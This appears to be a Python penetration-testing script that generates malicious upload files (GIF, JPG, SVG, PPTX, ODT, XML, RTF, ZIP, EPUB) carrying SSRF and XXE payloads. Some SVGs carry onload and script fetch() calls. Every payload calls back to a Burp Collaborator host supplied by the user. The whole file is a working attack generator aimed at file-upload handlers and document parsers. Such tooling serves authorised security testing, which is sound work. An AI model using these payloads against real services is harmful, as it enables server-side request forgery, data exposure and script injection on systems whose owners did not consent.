from pathlib import Path
from PIL import Image
import zipfile
import tempfile
import xml.etree.ElementTree as ET

def generate_others_payloads(output_dir, burp_collab):
    output_dir = Path(output_dir)
    
    ssrf_payloads = [
        f"http://{burp_collab}/ssrf1",
        f"https://{burp_collab}/ssrf2",
        f"http://127.0.0.1@{burp_collab}/ssrf3",
        f"http://localhost@{burp_collab}/ssrf4",
    ]
    
    xxe_payloads = [
        f'<!ENTITY xxe SYSTEM "http://{burp_collab}/xxe1">',
        f'<!ENTITY xxe SYSTEM "https://{burp_collab}/xxe2">',
        f'<!ENTITY xxe SYSTEM "file://{burp_collab}/xxe3">',
        f'<!ENTITY % xxe SYSTEM "http://{burp_collab}/xxe4">',
    ]
    
    gif_header = b'GIF89a'
    gif_trailer = b'\x00;'
    
    for i, payload in enumerate(ssrf_payloads, 1):
        gif_content = gif_header + payload.encode() + gif_trailer
        output_file = output_dir / f"gif_ssrf_{i}.gif"
        with open(output_file, 'wb') as f:
            f.write(gif_content)
    
    xmp_in_gif = f'''<?xpacket begin="\ufeff" id="W5M0MpCehiHzreSzNTczkc9d"?>
<x:xmpmeta xmlns:x="adobe:ns:meta/">
<rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#">
<rdf:Description rdf:about="" xmlns:xmp="http://ns.adobe.com/xap/1.0/">
<xmp:CreatorTool>Test</xmp:CreatorTool>
</rdf:Description>
</rdf:RDF>
</x:xmpmeta>
<?xpacket end="w"?>'''
    
    for i, payload in enumerate(xxe_payloads, 1):
        xmp_with_xxe = xmp_in_gif.replace('Test', payload)
        gif_content = gif_header + xmp_with_xxe.encode() + gif_trailer
        output_file = output_dir / f"gif_xxe_{i}.gif"
        with open(output_file, 'wb') as f:
            f.write(gif_content)
    
    img = Image.new('RGB', (100, 100), color='red')
    for i, payload in enumerate(ssrf_payloads, 1):
        img_copy = img.copy()
        output_file = output_dir / f"jpg_ssrf_{i}.jpg"
        img_copy.save(output_file, 'JPEG')
        
        with open(output_file, 'rb') as f:
            content = f.read()
        
        content_with_payload = content + b'\n' + payload.encode()
        with open(output_file, 'wb') as f:
            f.write(content_with_payload)
    
    svg_ssrf_template = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
<!ENTITY xxe SYSTEM "{}">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
<text>&xxe;</text>
</svg>'''
    
    for i, payload in enumerate(ssrf_payloads, 1):
        svg_content = svg_ssrf_template.format(payload)
        output_file = output_dir / f"svg_ssrf_{i}.svg"
        with open(output_file, 'w', encoding='utf-8') as f:
            f.write(svg_content)
    
    svg_xxe_template = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
<!ENTITY xxe SYSTEM "http://{}/xxe{}">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
<text>&xxe;</text>
</svg>'''
    
    for i, payload in enumerate(xxe_payloads, 1):
        svg_content = svg_xxe_template.format(burp_collab, i)
        output_file = output_dir / f"svg_xxe_{i}.svg"
        with open(output_file, 'w', encoding='utf-8') as f:
            f.write(svg_content)
    
    svg_rce_template = '''<svg xmlns="http://www.w3.org/2000/svg" onload="fetch('http://{}/rce{}')">
<rect width="100" height="100" fill="red"/>
</svg>'''
    
    for i in range(1, 6):
        svg_content = svg_rce_template.format(burp_collab, i)
        output_file = output_dir / f"svg_rce_{i}.svg"
        with open(output_file, 'w', encoding='utf-8') as f:
            f.write(svg_content)
    
    svg_script_template = '''<svg xmlns="http://www.w3.org/2000/svg">
<script>
fetch('http://{}/rce_script{}')
</script>
<rect width="100" height="100" fill="blue"/>
</svg>'''
    
    for i in range(1, 4):
        svg_content = svg_script_template.format(burp_collab, i)
        output_file = output_dir / f"svg_rce_script_{i}.svg"
        with open(output_file, 'w', encoding='utf-8') as f:
            f.write(svg_content)
    
    pptx_xxe_template = '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "http://{}/xxe_pptx">
]>
<p:presentation xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main">
<p:sldIdLst>
<p:sldId id="1" r:id="rId1"/>
</p:sldIdLst>
</p:presentation>'''
    
    pptx_content = pptx_xxe_template.format(burp_collab)
    output_file = output_dir / "pptx_xxe_1.pptx"
    
    with tempfile.TemporaryDirectory() as temp_dir:
        temp_path = Path(temp_dir)
        (temp_path / "[Content_Types].xml").write_text('<?xml version="1.0"?><Types></Types>')
        (temp_path / "_rels").mkdir()
        (temp_path / "ppt").mkdir()
        (temp_path / "ppt" / "presentation.xml").write_text(pptx_content)
        
        with zipfile.ZipFile(output_file, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
            for file_path in temp_path.rglob('*'):
                if file_path.is_file():
                    arcname = file_path.relative_to(temp_path)
                    zip_ref.write(file_path, arcname)
    
    odt_xxe_template = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "http://{}/xxe_odt">
]>
<office:document xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0">
<office:body>
<office:text>
<text:p>test</text:p>
</office:text>
</office:body>
</office:document>'''
    
    odt_content = odt_xxe_template.format(burp_collab)
    output_file = output_dir / "odt_xxe_1.odt"
    
    with tempfile.TemporaryDirectory() as temp_dir:
        temp_path = Path(temp_dir)
        (temp_path / "content.xml").write_text(odt_content)
        (temp_path / "META-INF").mkdir()
        (temp_path / "META-INF" / "manifest.xml").write_text('<?xml version="1.0"?><manifest></manifest>')
        
        with zipfile.ZipFile(output_file, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
            for file_path in temp_path.rglob('*'):
                if file_path.is_file():
                    arcname = file_path.relative_to(temp_path)
                    zip_ref.write(file_path, arcname)
    
    xml_xxe_template = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "http://{}/xxe_xml{}">
]>
<root>
<data>&xxe;</data>
</root>'''
    
    for i in range(1, 6):
        xml_content = xml_xxe_template.format(burp_collab, i)
        output_file = output_dir / f"xml_xxe_{i}.xml"
        with open(output_file, 'w', encoding='utf-8') as f:
            f.write(xml_content)
    
    rtf_ssrf_template = '''{{\\rtf1\\ansi\\deff0
{{\\fonttbl{{\\f0 Times New Roman;}}}}
\\f0\\fs24 
\\field{{\\*\\fldinst HYPERLINK "http://{}/rtf_ssrf"}}{{\\fldrslt Click here}}
}}'''
    
    for i in range(1, 4):
        rtf_content = rtf_ssrf_template.format(burp_collab)
        output_file = output_dir / f"rtf_ssrf_{i}.rtf"
        with open(output_file, 'w', encoding='utf-8') as f:
            f.write(rtf_content)
    
    zip_xxe_template = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "http://{}/xxe_zip{}">
]>
<root>
<data>&xxe;</data>
</root>'''
    
    for i in range(1, 4):
        xml_content = zip_xxe_template.format(burp_collab, i)
        xml_file = output_dir / f"temp_zip_{i}.xml"
        with open(xml_file, 'w', encoding='utf-8') as f:
            f.write(xml_content)
        
        zip_file = output_dir / f"zip_xxe_{i}.zip"
        with zipfile.ZipFile(zip_file, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
            zip_ref.write(xml_file, 'test.xml')
        
        xml_file.unlink()
    
    epub_xxe_template = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE package [
<!ENTITY xxe SYSTEM "http://{}/xxe_epub">
]>
<package xmlns="http://www.idpf.org/2007/opf" version="2.0">
<metadata>
<dc:title xmlns:dc="http://purl.org/dc/elements/1.1/">Test</dc:title>
</metadata>
<manifest>
<item id="chapter1" href="chapter1.xhtml" media-type="application/xhtml+xml"/>
</manifest>
<spine>
<itemref idref="chapter1"/>
</spine>
</package>'''
    
    epub_content = epub_xxe_template.format(burp_collab)
    output_file = output_dir / "epub_xxe_1.epub"
    
    with tempfile.TemporaryDirectory() as temp_dir:
        temp_path = Path(temp_dir)
        (temp_path / "META-INF").mkdir()
        (temp_path / "META-INF" / "container.xml").write_text('<?xml version="1.0"?><container><rootfiles><rootfile full-path="OEBPS/content.opf" media-type="application/oebps-package+xml"/></rootfiles></container>')
        (temp_path / "OEBPS").mkdir()
        (temp_path / "OEBPS" / "content.opf").write_text(epub_content)
        
        with zipfile.ZipFile(output_file, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
            for file_path in temp_path.rglob('*'):
                if file_path.is_file():
                    arcname = file_path.relative_to(temp_dir)
                    zip_ref.write(file_path, arcname)

